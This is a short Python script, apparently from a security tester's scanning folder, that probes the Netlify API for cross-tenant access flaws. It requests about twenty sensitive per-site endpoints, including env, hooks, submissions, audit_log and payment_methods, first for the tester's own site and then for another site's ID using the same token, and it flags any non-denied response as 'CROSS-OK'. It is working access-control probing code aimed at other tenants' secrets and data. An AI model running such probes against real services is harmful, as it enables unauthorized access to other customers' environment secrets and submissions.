# -*- coding: utf-8 -*-
"""swagger 敏感端点批量交叉:env/keys/hooks/deployed-branches 等
A token 自己 site 基线 + A token 访问 B site(判定 401/200)"""
import http.client, ssl, gzip, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, SITE_A

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()


def api(method, path, token=TOKEN_A):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept': 'application/json',
         'Authorization': 'Bearer ' + token}
    conn.request(method, path, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:200].decode('utf-8', 'ignore')
    conn.close()
    return st, out


endpoints = [
    ('GET', '/api/v1/sites/%s/env'),
    ('GET', '/api/v1/sites/%s/deployed-branches'),
    ('GET', '/api/v1/sites/%s/hooks'),
    ('GET', '/api/v1/sites/%s/plugins'),
    ('GET', '/api/v1/sites/%s/forms'),
    ('GET', '/api/v1/sites/%s/submissions'),
    ('GET', '/api/v1/sites/%s/functions'),
    ('GET', '/api/v1/sites/%s/builds'),
    ('GET', '/api/v1/sites/%s/snippets'),
    ('GET', '/api/v1/sites/%s/dns'),
    ('GET', '/api/v1/sites/%s/traffic'),
    ('GET', '/api/v1/sites/%s/split_tests'),
    ('GET', '/api/v1/sites/%s/identity'),
    ('GET', '/api/v1/sites/%s/dns_events'),
    ('GET', '/api/v1/sites/%s/assets'),
    ('GET', '/api/v1/sites/%s/audit_log'),
    ('GET', '/api/v1/sites/%s/payment_methods'),
    ('GET', '/api/v1/sites/%s/metadata'),
    ('GET', '/api/v1/sites/%s/provision'),
    ('GET', '/api/v1/sites/%s/links'),
]
for method, tpl in endpoints:
    pa = tpl % SITE_A
    pb = tpl % SITE_B
    sta, oa = api(method, pa)
    stb, ob = api(method, pb)
    flag = ' <<< CROSS-OK' if stb not in (401, 403, 404) else ''
    print('%-46s self[%d] cross[%d]%s  %s' % (tpl.split('%s')[-1], sta, stb, flag, (oa or ob)[:80]))
